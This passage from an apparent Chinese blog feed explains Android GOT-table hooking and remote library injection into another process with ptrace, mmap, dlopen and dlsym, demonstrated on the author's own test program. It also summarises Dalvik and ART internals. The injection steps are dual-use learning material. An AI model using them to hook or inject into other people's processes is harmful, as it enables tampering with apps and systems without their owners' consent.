e_version;</span><br><span class="line">  Elf32_Addr e_entry;</span><br><span class="line">  Elf32_Off e_phoff;</span><br><span class="line">  Elf32_Off e_shoff;</span><br><span class="line">  Elf32_Word e_flags;</span><br><span class="line">  Elf32_Half e_ehsize;</span><br><span class="line">  Elf32_Half e_phentsize;</span><br><span class="line">  Elf32_Half e_phnum;</span><br><span class="line">  Elf32_Half e_shentsize;</span><br><span class="line">  Elf32_Half e_shnum;</span><br><span class="line">  Elf32_Half e_shstrndx;</span><br><span class="line">&#125; Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>Elf32_Ehdr.e_shoff:节区头表偏移<br>Elf32_Ehdr.e_shstrndx:字符串表在节区头表中的索引<br>Elf32_Ehdr.e_shentsize:每个节区头大小</p><p>字符串表偏移：Elf32_Ehdr.e_shoff+Elf32_Ehdr.e_shstrndx*Elf32_Ehdr.e_shentsize</p><p>节区头表名称来源有里之后，就可以遍历节区头表了。</p><p>节区头表偏移：Elf32_Ehdr.e_shoff</p><p><strong>ELFSectionHeader</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">typedef struct elf32_shdr &#123;</span><br><span class="line">  Elf32_Word sh_name;</span><br><span class="line">  Elf32_Word sh_type;</span><br><span class="line">  Elf32_Word sh_flags;</span><br><span class="line">  Elf32_Addr sh_addr;</span><br><span class="line">  Elf32_Off sh_offset;</span><br><span class="line">  Elf32_Word sh_size;</span><br><span class="line">  Elf32_Word sh_link;</span><br><span class="line">  Elf32_Word sh_info;</span><br><span class="line">  Elf32_Word sh_addralign;</span><br><span class="line">  Elf32_Word sh_entsize;</span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p>sh_name:节区名称在字符串表中的偏移<br>sh_type:节区类型</p><p>通过判断类型值和节区名称来确定GOT表节区</p><p>最后获取到模块加载地址后作为基址，加上偏移即是GOT表地址，GOT表就是一个地址表，通过遍历挨个地址匹配，找到后修改即可，注意修改内存页权限。（不知道为什么GOT在内存中是没有可写权限的）<br><img src="/2018/04/08/GOTHOOK/15232059915351.jpg" alt=""><br>在地址0xb6f2af54处</p><p>代码地址：<a href="https://github.com/Minxin/gothooklocal" target="_blank" rel="noopener">https://github.com/Minxin/gothooklocal</a></p><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><p>&emsp;&emsp;在测试中发现一些问题，程序在调用函数时，特别在多次调用时，会将函数指针存放在寄存器中，供下一次调用使用，这个时候无论修改何处，寄存器中的值是不变的，每次调用形式为：<code>BLX  R4</code>.所以这样hook是没有任何效果的。<br>&emsp;&emsp;写在其他函数中，调用就会正常，间接跳转的形式，GOT修改后生效。<br><img src="/2018/04/08/GOTHOOK/15232067018523.jpg" alt="result-w500"></p><p>可以看到GOT修改之后，<code>just 2</code>和<code>just 3</code>是通过寄存器跳转的，没有效果；<code>for test</code>是通过间接跳转的，生效。</p><h2 id="远程hook"><a href="#远程hook" class="headerlink" title="远程hook"></a>远程hook</h2><p>相比较的话，多了一步注入操作。 </p><p>注入程序参照：<a href="https://blog.csdn.net/qq1084283172/article/details/46859931" target="_blank" rel="noopener">https://blog.csdn.net/qq1084283172/article/details/46859931</a><br><strong>注入流程：</strong><br><img src="http://gslab.qq.com/data/attachment/portal/201604/27/153304u2qgl1wax4ntlrzs.png" alt="injectflow-c"></p><h3 id="注入方案："><a href="#注入方案：" class="headerlink" title="注入方案："></a>注入方案：</h3><p>我们将上面实现的本地hook代码编译成动态库，把这个库注入到目标进程，然后调用hook函数，那么需要目标程序调用dlopen函数来装载库，调用dlsym来获取到hook函数地址，最后调用。并且这些函数需要的参数我们也需要写入目标进程的地址空间中，所以还需要mmap来开出一块地址空间开写入参数数据。</p><p>获取函数地址，我们计算一下偏移即可：<br><code>remote_func_addr=local_func_addr+(remote_base-local_base)</code></p><p>获取本模块内存基址和目标模块的内存基址，差值即为某函数在本地地址和目标地址的偏移。</p><h3 id="基址获取："><a href="#基址获取：" class="headerlink" title="基址获取："></a>基址获取：</h3><p>在<code>/proc/[pid]/maps</code> 中查找模块名，对应行的起始地址就是模块的基址。</p><h3 id="开辟空间："><a href="#开辟空间：" class="headerlink" title="开辟空间："></a>开辟空间：</h3><p>调用mmap得到一块地址空间，mmap函数定义<br><code>void* mmap(void* start,size_t length,int prot,int flags,int fd,off_t offset);</code><br>调用前需要构造参数。</p><h3 id="参数设置："><a href="#参数设置：" class="headerlink" title="参数设置："></a>参数设置：</h3><p>arm中参数存放在r0～r3及栈中，超出四个参数，就需要用栈存放。</p><p>利用ptrace设置布置好的参数列表，跳转到函数的话，直接设置pc值即可。</p><p>mmap调用后需要获得返回值，返回值是开辟出的地址空间的地址，返回值是存放在r0中的，PTRACE_GETREGS获取寄存器，取出r0即可。</p><h3 id="装载hook库："><a href="#装载hook库：" class="headerlink" title="装载hook库："></a>装载hook库：</h3><p>调用dlopen将指定的库装载进目标进程中<br><code>void * dlopen( const char * pathname, int mode);</code></p><p>这里由于参数是指针，是一个地址，进程中没有需要的字符串，所以需要将字符串写入目标进程中，之前mmap申请的空间派上用场了，使用PTRACE_POKETEXT/PTRACE_POKEDATA写入指定地址即可，注意字节数量。</p><p>dlopen调用后返回装载的库的句柄，也需要获取。</p><h3 id="获取函数地址："><a href="#获取函数地址：" class="headerlink" title="获取函数地址："></a>获取函数地址：</h3><p>调用dlsym获得hook函数的地址<br><code>void* dlsym(void* handle,const char* symbol)</code><br>这里的符号参数也需要写入目标内存中，用ida打开so，可以看它的导出符号。</p><p>dlsym的返回值就是hook函数的地址，也需要获取。</p><p>最后再调用hook函数即可。</p><p>其实hook函数的获取可以使用计算偏移的方式，注入程序自己也装载动态库，获取hook函数地址后，加上基址差值，也可以得到hook函数在目标进程中的地址。可以不用让目标程序调用dlsym。</p><h3 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h3><p>注入程序：<br><img src="/2018/04/08/GOTHOOK/15232917260881.jpg" alt="inject-w500"></p><p>被注入程序：<br><img src="/2018/04/08/GOTHOOK/15232917491072.jpg" alt="tobehook-w500"></p><p>被注入程序首先在被hook前调用puts，进入sleep，启动注入进程，完成注入和hook后，输出的信息和之前本地hook的输出差不多，最后继续执行，再次调用puts时，已经被myputs代替，输入信息前有前缀”FAKE:”。</p><p>代码地址：<a href="https://github.com/Minxin/gothookremote" target="_blank" rel="noopener">https://github.com/Minxin/gothookremote</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;GOT表hook&quot;&gt;&lt;a href=&quot;#GOT表hook&quot; class=&quot;headerlink&quot; title=&quot;GOT表hook&quot;&gt;&lt;/a&gt;GOT表hook&lt;/h1
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>android虚拟机（二）</title>
    <link href="http://fancy-blogs.com/2018/04/03/androidVM2/"/>
    <id>http://fancy-blogs.com/2018/04/03/androidVM2/</id>
    <published>2018-04-03T09:31:07.171Z</published>
    <updated>2018-04-04T18:21:04.759Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="android虚拟机（二）"><a href="#android虚拟机（二）" class="headerlink" title="android虚拟机（二）"></a>android虚拟机（二）</h1><h2 id="ART虚拟机加载流程"><a href="#ART虚拟机加载流程" class="headerlink" title="ART虚拟机加载流程"></a>ART虚拟机加载流程</h2><p>summary up <a href="https://blog.csdn.net/luoshengyang/article/details/39533503" target="_blank" rel="noopener">https://blog.csdn.net/luoshengyang/article/details/39533503</a></p><p>需要先了解：<br><a href="https://blog.csdn.net/lusing/article/details/52453246" target="_blank" rel="noopener">ART中几个组件</a><br><a href="https://blog.csdn.net/briblue/article/details/54973413" target="_blank" rel="noopener">java中的ClassLoader</a></p><p>&emsp;&emsp;AndroidRuntime类会对mJavaVM和JNIEnv进行创建，利用JNI接口，就可以获取到mJavaVM的入口类，并通过这个入口进入虚拟机内部，开始运行。<br>&emsp;&emsp;这个入口类是com.android.internal.os.ZygoteInit，通过JNI提供的FindClass和GetStaticMethodID函数就能获取到入口类的静态成员函数main，在由JNI提供的CallStaticVoidMethod就可以调用获取到的main函数，进入虚拟机内部。</p><p>JNI类的静态成员函数FindClass：</p><p>ClassLoader<br><code>Handle&lt;mirror::ClassLoader&gt;class_loader(hs.NewHandle(GetClassLoader(soa)));</code></p><p>need to get the instance of Runtime from the current Thread，then we can get the ClassLinker by Runtime-&gt;getClassLinker.</p><p>ClassLinker<br>1⃣️-&gt;FindClass<br>2⃣️-&gt;FindSystemClass</p><h3 id="FindClass："><a href="#FindClass：" class="headerlink" title="FindClass："></a><strong>FindClass：</strong></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (class_loader.Get() == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// The boot class loader, search the boot class path.</span></span><br><span class="line">    ClassPathEntry pair = FindInClassPath(descriptor, boot_class_path_);</span><br><span class="line">   <span class="keyword">if</span> (pair.second != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">     <span class="keyword">return</span> DefineClass(descriptor, NullHandle&lt;mirror::ClassLoader&gt;(), *pair.first, *pair.second);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure><ol><li>如果要找的类是基础类型，则直接调用FindPrimitiveClass查找基础类型；如果不是则在传入的ClassLoader的已加载类表中查找类(首先会判断ClassLaoder是否为null，如果为null,就在boot_class<em>table</em>中查找，否则就在ClassLoader自己的ClassTable中查找)，如果找到，确保类已经被解析并返回</li><li>如果在传入的ClassLoader的已加载类表中没有找到类,则首先判断ClassLoader是否为空，如果为空，在boot_class<em>path</em>（系统启动类路径）中查找，如果不为空，则调用FindClassInPathClassLoader在传入的ClassLoader以及它的各级parent中查找类</li><li>如果仍然没有找到，则调用传入的ClassLoader的loadClass在传入的ClassLoader中查找，找到返回，否则抛出异常</li></ol><p>copy from <a href="https://www.jianshu.com/p/29b580e452a1" target="_blank" rel="noopener">here</a></p><h3 id="DefineClass："><a href="#DefineClass：" class="headerlink" title="DefineClass："></a><strong>DefineClass：</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mirror::Class* ClassLinker::DefineClass(const char* descriptor,</span><br><span class="line">                                       Handle&lt;mirror::ClassLoader&gt; class_loader,</span><br><span class="line">                                       const DexFile&amp; dex_file,</span><br><span class="line">                                       const DexFile::ClassDef&amp; dex_class_def)&#123;</span><br><span class="line">                                       ...</span><br></pre></td></tr></table></figure><ol><li>ClassLinker是否已经初始化完成（在初始化时会创建一些内部类）</li><li>未初始化完成时，loadClass内部类或为类allocclass分配空间再loadClass</li><li>LoadClass从dex中加载类，并通过InsertClass添加到已加载类列表中（在其他线程同时在加载该类时，通过EnsureResolved确保同步）</li><li>LinkClass来对加载后的类进行解析，类解析完后得到一个Class对象</li></ol><h3 id="LoadClass："><a href="#LoadClass：" class="headerlink" title="LoadClass："></a><strong>LoadClass：</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void ClassLinker::LoadClass(const DexFile&amp; dex_file,  </span><br><span class="line">                            const DexFile::ClassDef&amp; dex_class_def,  </span><br><span class="line">                            SirtRef&lt;mirror::Class&gt;&amp; klass,  </span><br><span class="line">                            mirror::ClassLoader* class_loader) &#123;</span><br><span class="line">                            ...</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">dex_file</td><td style="text-align:left">类型为DexFile，描述要加载的类所在的DEX文件</td></tr><tr><td style="text-align:left">dex_class_def</td><td style="text-align:left">类型为ClassDef，描述要加载的类在DEX文件里面的信息</td></tr><tr><td style="text-align:left">klass</td><td style="text-align:left">类型为Class，描述加载完成的类</td></tr><tr><td style="text-align:left">class_loader</td><td style="text-align:left">类型为ClassLoader，描述所使用的类加载器</td></tr></tbody></table><ol><li><p>将参数class_loader描述的ClassLoader设置到klass描述的Class对象中去，即给每一个已加载类关联一个类加载器。</p></li><li><p>通过DexFile类的成员函数GetIndexForClassDef获得正在加载的类在DEX文件中的类索引号，并且设置到klass描述的Class对象中去。这个类索引号是一个很重要的信息，因为我们需要通过类索引号在相应的OAT文件找到一个OatClass结构体。有了这个OatClass结构体之后，我们才可以找到类方法对应的本地机器指令。</p></li><li><p>从参数dex_file描述的DEX文件中获得正在加载的类的静态成员变量和实例成员变量个数，并且为每一个静态成员变量和实例成员变量都分配一个ArtField对象，接着通过ClassLinker类的成员函数LoadField对这些ArtField对象进行初始化。初始好得到的ArtField对象全部保存在klass描述的Class对象中。</p></li><li><p>调用ClassLinker类的成员函数GetOatClass，从相应的OAT文件中找到与正在加载的类对应的一个OatClass结构体oat_class。这需要利用到上面提到的DEX类索引号，这是因为DEX类和OAT类根据索引号存在一一对应关系。</p></li><li><p>从参数dex_file描述的DEX文件中获得正在加载的类的直接成员函数和虚拟成员函数个数，并且为每一个直接成员函数和虚拟成员函数都分配一个ArtMethod对象，接着通过ClassLinker类的成员函数LoadMethod对这些ArtMethod对象进行初始化。初始好得到的ArtMethod对象全部保存在klass描述的Class对象中。</p></li><li><p>每一个直接成员函数和虚拟成员函数都对应有一个函数索引号。根据这个函数索引号可以在第4步得到的OatClass结构体中找到对应的本地机器指令。所有与这些成员函数关联的本地机器指令信息通过全局函数LinkCode设置到klass描述的Class对象中。</p></li></ol><h3 id="LinkCode"><a href="#LinkCode" class="headerlink" title="LinkCode:"></a><strong>LinkCode:</strong></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static void LinkCode(SirtRef&lt;mirror::ArtMethod&gt;&amp; method, const OatFile::OatClass* oat_class,  </span><br><span class="line">                     uint32_t method_index)  </span><br><span class="line">    SHARED_LOCKS_REQUIRED(Locks::mutator_lock_) &#123;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left">method</td><td style="text-align:left">要设置本地机器指令的类方法</td></tr><tr><td style="text-align:left">oat_class</td><td style="text-align:left">类方法method在OAT文件中对应的OatClass结构体</td></tr><tr><td style="text-align:left">method_index</td><td style="text-align:left">类方法method的索引号</td><td>。</td></tr></tbody></table><p>在OatClass中，用method就能索引到method的本地指令地址，调用LinkMethod就能将method解析为ArtMethod。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void OatFile::OatMethod::LinkMethod(mirror::ArtMethod* method) const &#123;  </span><br><span class="line">  CHECK(method != NULL);  </span><br><span class="line">  method-&gt;SetEntryPointFromCompiledCode(GetCode());  </span><br><span class="line">  method-&gt;SetFrameSizeInBytes(frame_size_in_bytes_);  </span><br><span class="line">  method-&gt;SetCoreSpillMask(core_spill_mask_);  </span><br><span class="line">  method-&gt;SetFpSpillMask(fp_spill_mask_);  </span><br><span class="line">  method-&gt;SetMappingTable(GetMappingTable());  </span><br><span class="line">  method-&gt;SetVmapTable(GetVmapTable());  </span><br><span class="line">  method-&gt;SetNativeGcMap(GetNativeGcMap());  // Used by native methods in work around JNI mode.  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来通过OatMethod::GetCode获得OatMethod结构体中的code<em>offset</em>字段（指向的是一个本地机器指令函数，这个本地机器指令函数正是通过翻译该方法的DEX字节码得到的），并且通过调用ArtMethod类的成员函数SetEntryPointFromCompiledCode设置到参数method描述的ArtMethod对象中去。</p><p>类方法可以通过本地指令执行，也可以通过解释器执行<br>NeedsInterpreter检查该类方法是否需要解释器<br>enter_interpreter?true or false</p><p><strong>设置入口点：</strong></p><p>需要解释器的非native方法：artInterpreterToInterpreterBridge设置为解释器执行该类方法的入口点<br>不需要解释器的方法或native方法：artInterpreterToCompiledCodeBridge设置为解释器执行该类方法的入口点（伪入口，间接调用本地指令）<br>抽象方法 ： GetCompiledCodeToInterpreterBridge-&gt;Interpreter</p><p><strong>调整入口点：</strong></p><p>静态类构造方法：Trampoline-&gt;wait class initializing-&gt;native code </p><blockquote><p>ClassLinker::FixupStaticTrampolines install the Trampoline</p></blockquote><p>需要通过解释器执行的方法：</p><ol><li>没有对应的本地机器指令，即参数code的值等于NULL。</li><li>ART虚拟机运行在解释模式中，并且类方法不是JNI方法，并且也不是代理方法</li></ol><p>解释器入口都设置为：GetCompiledCodeToInterpreterBridge（to get a unified enterpoint）</p><p>注册native方法</p><blockquote><p>ArtMethod类的成员函数UnregisterNative实际上就是将一个JNI方法的初始化入口设置为通过调用函数GetJniDlsymLookupStub获得的一个Stub。这个Stub的作用是，当一个JNI方法被调用时，如果还没有显示地注册有Native函数，那么它就会自动从已加载的SO文件查找是否存在一个对应的Native函数。如果存在的话，就将它注册为JNI方法的Native函数，并且执行它。这就是隐式的JNI方法注册。</p></blockquote><p>UpdateMethodsCode更新方法入口，是否设置监控函数</p><h3 id="GetStaticMethodID："><a href="#GetStaticMethodID：" class="headerlink" title="GetStaticMethodID："></a><strong>GetStaticMethodID：</strong></h3><blockquote><ol><li><p>将参数jni_class的值转换为一个Class指针c，因此就可以得到一个Class对象，并且通过ClassLinker类的成员函数EnsureInitialized确保该Class对象描述的类已经初始化。</p></li><li><p>Class对象c描述的类在加载的过程中，经过解析已经关联上一系列的成员函数。这些成员函数可以分为两类：Direct和Virtual。Direct类的成员函数包括所有的静态成员函数、私有成员函数和构造函数，而Virtual则包括所有的虚成员函数。因此：<br>2.1. 当参数is_static的值等于true时，那么就表示要查找的是静态成员函数，这时候就在Class对象c描述的类的关联的Direct成员函数列表中查找参数name和sig对应的成员函数。这是通过调用Class类的成员函数FindDirectMethod来实现的。<br>2.2. 当参数is_static的值不等于true时，那么就表示要查找的是虚拟成员函数或者非静态的Direct成员函数，这时候先在Class对象c描述的类的关联的Virtual成员函数列表中查找参数name和sig对应的成员函数。这是通过调用Class类的成员函数FindVirtualMethod来实现的。如果找不到对应的虚拟成员函数，那么再在Class对象c描述的类的关联的Direct成员函数列表中查找参数name和sig对应的成员函数。</p></li><li><p>经过前面的查找过程，如果都不能在Class对象c描述的类中找到与参数name和sig对应的成员函数，那么就抛出一个NoSuchMethodError异常。否则的话，就将查找得到的ArtMethod对象封装成一个jmethodID值返回给调用者。</p></li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h1 id=&quot;android虚拟机（二）&quot;&gt;&lt;a href=&quot;#android虚拟机（二）&quot; class=&quot;headerlink&quot; title=&quot;android虚拟机（二）&quot;&gt;&lt;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>android虚拟机（一）</title>
    <link href="http://fancy-blogs.com/2018/03/29/androidVM1/"/>
    <id>http://fancy-blogs.com/2018/03/29/androidVM1/</id>
    <published>2018-03-28T16:38:45.766Z</published>
    <updated>2019-02-25T05:08:10.654Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><h1 id="android虚拟机（一）"><a href="#android虚拟机（一）" class="headerlink" title="android虚拟机（一）"></a>android虚拟机（一）</h1><h2 id="Dalvik虚拟机"><a href="#Dalvik虚拟机" class="headerlink" title="Dalvik虚拟机"></a>Dalvik虚拟机</h2><h3 id="Dalvik虚拟机的启动过程"><a href="#Dalvik虚拟机的启动过程" class="headerlink" title="Dalvik虚拟机的启动过程"></a>Dalvik虚拟机的启动过程</h3><p><a href="https://blog.csdn.net/luoshengyang/article/details/8885792" target="_blank" rel="noopener">https://blog.csdn.net/luoshengyang/article/details/8885792</a></p><p>Zygote进程在启动时会创建一个Dalvik实例，在它孵化app的进程时会复制一份到app的进程中，使每一个app进程都有一个独立的Dalvik虚拟机实例。</p><p><img src="http://img.blog.csdn.net/20130506004759886" alt=""></p><p>Dalvik虚拟机在Zygote进程中的启动过程，这个启动过程主要完成以下4个事情：</p><ol><li>创建了一个Dalvik虚拟机实例；（这里只是对JavaVM结构的成员变量赋值，真正环境的创建在step.3）</li><li>为主线程的设置了一个JNI环境；</li><li>加载了Java核心类及其JNI方法；</li><li>注册了Android核心类的JNI方法。</li></ol><p>AndroidRuntime类的start主要做了一下四件事：</p><ol><li>调用startVm来创建一个Dalvik虚拟机实例，保存在成员变量mJavaVM。（JavaVM是Dalvik虚拟机在JNI中的表示）</li><li>调用成员函数startReg来注册一些Android核心类的JNI方法。</li><li>通过JNI接口，FindClass找到com.android.internal.os.ZygoteInit类，通过JNI接口，GetStaticMethodID找到com.android.internal.os.ZygoteInit类的静态成员函数main作为java层的入口。</li><li>在Zygote进程退出时，会调用JavaVM的成员函数DetachCurrentThread来使Dalvik虚拟机实例和Zygote进程的主线程脱离，再调用DestroyJavaVM来销毁Dalvik虚拟机实例。</li></ol><p>关于JavaVM与JVM的区别：在java里，每一个process可以产生多个java vm对象，但是在android上，每一个process只有一个Dalvik虚拟机对象，也就是在android进程中是通过有且只有一个虚拟器对象来服务所有java和c/c++代码。</p><p>startVM调用JNI_CreateJavaVM来创建</p><p>JNI_CreateJavaVM主要完成以下四件事情。</p><ol><li>为当前进程创建一个Dalvik虚拟机实例，即一个JavaVMExt对象。</li><li>为当前线程创建和初始化一个JNI环境，即一个JNIEnvExt对象，这是通过调用函数dvmCreateJNIEnv来完成的。</li><li>将参数vm_args所描述的Dalvik虚拟机启动选项拷贝到变量argv所描述的一个字符串数组中去，并且调用函数dvmStartup来初始化前面所创建的Dalvik虚拟机实例。</li><li>调用函数dvmChangeStatus将当前线程的状态设置为正在执行NATIVE代码，并且将面所创建和初始化好的JavaVMExt对象和JNIEnvExt对象通过输出参数p_vm和p_env返回给调用者。</li></ol><p>在Java层调用C层的本地函数时，调用c本地函数的线程必然通过Dalvik虚拟机来调用c层的本地函数，此时，Dalvik虚拟机会为本地的C组件实例化一个JNIEnv指针，该指针指向Dalvik虚拟机的具体的函数列表。<br>当JNI的c组件调用Java层的方法或者属性时，需要通过JNIEnv指针来进行调用。<br>当本地c/c++想获得当前线程所要使用的JNIEnv时，可以使用Dalvik虚拟机对象的JavaVM<em> jvm-&gt;GetEnv()返回当前线程所在的JNIEnv</em><br>（可以联系在native中，动态注册函数的流程）</p><p>JavaVMExt对象和JNIEnv对象都有一个函数列表。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct JavaVMExt &#123;</span><br><span class="line">    <span class="keyword">const</span> struct JNIInvokeInterface* funcTable;     <span class="comment">/* must be first */</span></span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">struct JNIEnvExt &#123;</span><br><span class="line">    <span class="keyword">const</span> struct JNINativeInterface* funcTable;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>调用dvmCreateJNIEnv来创建JNIEnv</p><ol><li>创建一个JNIEnvExt对象，用来描述一个JNI环境，并且设置这个JNIEnvExt对象的宿主Dalvik虚拟机，以及所使用的本地接口表，即设置这个JNIEnvExt对象的成员变量funcTable和vm。这里的宿主Dalvik虚拟机即为当前进程的Dalvik虚拟机，它保存在全局变量gDvm的成员变量vmList中。本地接口表由全局变量gNativeInterface来描述。<ol><li>参数self描述的是前面创建的JNIEnvExt对象要关联的线程，可以通过调用函数dvmSetJniEnvThreadId来将它们关联起来。注意，当参数self的值等于NULL的时候，就表示前面的JNIEnvExt对象是要与主线程关联的，但是要等到后面再关联，因为现在用来描述主线程的Thread对象还没有准备好。通过将一个JNIEnvExt对象的成员变量envThreadId和self的值分别设置为0x77777775和0x77777779来表示它还没有与线程关联。</li><li>在一个Dalvik虚拟机里面，可以运行多个线程。所有关联有JNI环境的线程都有一个对应的JNIEnvExt对象，这些JNIEnvExt对象相互连接在一起保存在用来描述其宿主Dalvik虚拟机的一个JavaVMExt对象的成员变量envList中。因此，前面创建的JNIEnvExt对象需要连接到其宿主Dalvik虚拟机的JavaVMExt链表中去。</li></ol></li></ol><p>创建JavaVM和JNIEnv过程大致相同，绑定一个函数列表，然后将该对象的指针保存起来。</p><p>调用dvmStartup初始化JavaVM</p><p>子模块的初始化</p><p>最后一步的初始化：dvmDebuggerStartup-&gt;dvmInitZygote</p><p>调用了系统调用setpgid来设置当前进程，即Zygote进程的进程组ID，两个参数均为0，这意味着Zygote进程的进程组ID与进程ID是相同的，也就是说，Zygote进程运行在一个单独的进程组里面。</p><h3 id="Dalvik虚拟机的运行过程"><a href="#Dalvik虚拟机的运行过程" class="headerlink" title="Dalvik虚拟机的运行过程"></a>Dalvik虚拟机的运行过程</h3><p><a href="http://blog.csdn.net/luoshengyang/article/details/8914953" target="_blank" rel="noopener">http://blog.csdn.net/luoshengyang/article/details/8914953</a></p><p><img src="http://img.blog.csdn.net/20130512232649003" alt=""></p><p>JNIEnv的CallStaticVoidMethod调用回调函数表中的CallStaticVoidMethodV，来执行参数clazz和methodID所描述的Java代码。</p><p>CallStaticVoidMethodV-&gt;CallStatic##_jname##MethodV-&gt;dvmCallMethodV</p><p>函数dvmCallMethodV首先检查参数method描述的函数是否是一个JNI方法。如果是的话，那么它所指向的一个Method对象的成员变量nativeFunc就指向该JNI方法的地址，因此就可以直接对它进行调用。否则的话，就说明参数method描述的是一个Java函数，这时候就需要继续调用函数dvmInterpret来执行它的代码.</p><p>dvmCallMethodV中会根据执行模式来选择不同的解释器入口。</p><p>进入解释器后，对需要执行的java的类所相关部分进行初始化，之后是循环读取、解释指令码，直到return为止。</p><p>其中讲到Dalvik虚拟机解释器的可移植版本实现中，解释器对指令流的解释时，在获取到return指令时截止，是否可以在return指令后添加junk code。</p><h2 id="ART虚拟机"><a href="#ART虚拟机" class="headerlink" title="ART虚拟机"></a>ART虚拟机</h2><p><a href="https://blog.csdn.net/luoshengyang/article/details/39256813" target="_blank" rel="noopener">https://blog.csdn.net/luoshengyang/article/details/39256813</a></p><p>ART虚拟机实例的创建和Dalvik大相径庭。<br>ART虚拟机在Zygote进程中创建并启动，再由Zygote来fork给应用程序进程</p><p>###ART加载OAT文件的过程</p><p><a href="https://blog.csdn.net/luoshengyang/article/details/39307813" target="_blank" rel="noopener">https://blog.csdn.net/luoshengyang/article/details/39307813</a></p><p>讲解一下OAT文件的格式，以及加载OAT的过程，包括涉及到的函数</p><p>oat文件本质上就是一个ELF文件</p><p>启动<br>Runtime create<br>Runtime init<br>&emsp;&emsp;Android 5.0中将option的解析放在了init中<br>&emsp;&emsp;&emsp;&emsp;1⃣️ ART启动<br>&emsp;&emsp;&emsp;&emsp;2⃣️ interpret DEX<br>&emsp;&emsp;ParsedOptions::Create<br>&emsp;&emsp;&emsp;&emsp;解析启动参数<br>&emsp;&emsp;Heap<br>&emsp;&emsp;&emsp;&emsp;space::ImageSpace::Create<br>&emsp;&emsp;JavaVMExt<br>&emsp;&emsp;Thread::Attach<br>&emsp;&emsp;GetHeap</p><p>运行<br>OatFile::Open<br>&emsp;&emsp;1⃣️portable&amp;&amp;executable：OpenDlopen<br>&emsp;&emsp;new OatFile<br>&emsp;&emsp;Dlopen<br>&emsp;&emsp;&emsp;&emsp;dlopne、dlsym -&gt; get begin/end (得到内存中oatdata段的内存区域)<br>&emsp;&emsp;2⃣️OpenElfFile<br>&emsp;&emsp;ElfFileOpen<br>&emsp;&emsp;&emsp;&emsp;FindDynamicSymbolAddress-&gt;get begin/end (得到内存中oatdata段的内存区域)<br>&emsp;&emsp;&emsp;&emsp;Setup<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;GetOatHeader<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;GetOatHeader().GetKeyValueStoreSize()<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;GetOatHeader().GetDexFileCount()</p><p><img src="/2018/03/29/androidVM1/15226886044319.jpg" alt="oatdata-c500"></p><p>获取到Dex文件的过程：先获取到OAT文件中的oatdata段起始地址，找到oatheader，跃过header，找到oat_dex_file，由偏移dex_file_offset（与oatdata起始的偏移）定位到dexfile。</p><p>获取方法的过程：同样以上方式找到oat_dex_file，在dex_file_offset后是一个数组，元素是指向oat_class的指针，每个oat_class与dex中的class一一对应。<br>oat_class:</p><table><thead><tr><th>Size</th><th>Name</th></tr></thead><tbody><tr><td>Int16</td><td>status</td></tr><tr><td>Int16</td><td>Type</td></tr><tr><td>Int32</td><td>Bitsize(when type==1)</td></tr><tr><td>Byte * bitsize</td><td>Bitmap[bitsize]（when type==1）</td></tr><tr><td>Int32 <em> 2 </em> 